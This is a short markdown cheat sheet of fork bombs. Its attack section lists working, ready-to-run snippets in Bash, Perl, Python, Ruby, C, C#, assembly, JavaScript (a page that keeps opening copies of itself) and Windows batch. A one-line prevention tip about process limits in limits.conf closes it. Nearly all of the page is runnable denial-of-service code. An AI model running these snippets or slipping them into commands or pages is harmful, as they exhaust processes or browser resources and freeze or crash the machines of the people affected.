# Fork Bomb 

## Attack

### Bash

```no-highlight
:(){ :|:& };:
```

### Bash Script

```no-highlight
#!/bin/bash
$0|$0& #"$0" returns the name of the shell script itself
```

### Perl

```no-highlight
perl -e "fork while fork" &
```

### Python

```no-highlight
import os
while 1:
    os.fork()
```

### Ruby

```no-highlight
loop { fork { __FILE__ } }
```

### C

```no-highlight
#include <unistd.h>

int main(void)
{
    while(1) fork();
}
```

### C#

```no-highlight
static void Main()
{
    while (true) Process.Start(Assembly.GetExecutingAssembly().Location);
}
```

### Assembly

```no-highlight
section .text
    global_start
    
_start:
    mov eax,2 ;System call for forking
    int 0x80  ;Call kernel
    jmp _start
```

### Javascript

```no-highlight
<script>
setInterval(function() {
  var w = window.open();
  w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
}, 10);
</script>
```

### windows batch file

```no-highlight
:s
start "" %0
goto s
```

Same as above but shorter

```no-highlight
%0|%0
```

## Prevention

### /etc/security/limits.conf
```no-highlight
...
peyman hard nproc 300
...
```
Restart PAM.